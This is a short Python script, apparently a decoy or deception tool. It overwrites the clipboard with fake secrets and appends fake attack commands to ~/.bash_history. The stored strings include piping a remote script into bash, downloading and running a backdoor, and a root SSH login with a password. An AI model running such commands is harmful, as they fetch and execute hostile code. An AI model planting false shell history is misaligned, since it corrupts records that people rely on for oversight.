import os
import random
import pyperclip
from datetime import datetime

# Fake commands to insert into bash history
FAKE_COMMANDS = [
    "curl http://malicious-site.org/exploit.sh | bash",
    "nmap -sC -sV 192.168.1.100",
    "sshpass -p hunter2 ssh root@192.168.1.1",
    "python3 exploit.py --rce --target 10.10.10.10",
    "echo 'dXNlcjpwYXNz' | base64 -d > creds.txt",
    "wget http://192.168.1.5/backdoor -O /tmp/bd && chmod +x /tmp/bd && /tmp/bd"
]

# Fake clipboard entries
CLIPBOARD_ENTRIES = [
    "-----BEGIN PRIVATE KEY-----\nMIICeAIBADANBgkqh...",
    "api_key=sk_test_51H8mN...QMP0",
    "ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEArqZ...",
    '{"username":"admin","password":"123456"}',
    "vault_token=s.4gKMf1MvXH9N9F8Y"
]

def poison_clipboard():
    fake_clip = random.choice(CLIPBOARD_ENTRIES)
    pyperclip.copy(fake_clip)
    print(f"[+] Clipboard poisoned with fake data.")

def poison_bash_history():
    hist_path = os.path.expanduser("~/.bash_history")
    if os.path.exists(hist_path):
        with open(hist_path, "a") as f:
            f.write(f"# {datetime.now()}\n")
            f.write(random.choice(FAKE_COMMANDS) + "\n")
        print("[+] Fake command added to bash history.")

if __name__ == "__main__":
    poison_clipboard()
    poison_bash_history()
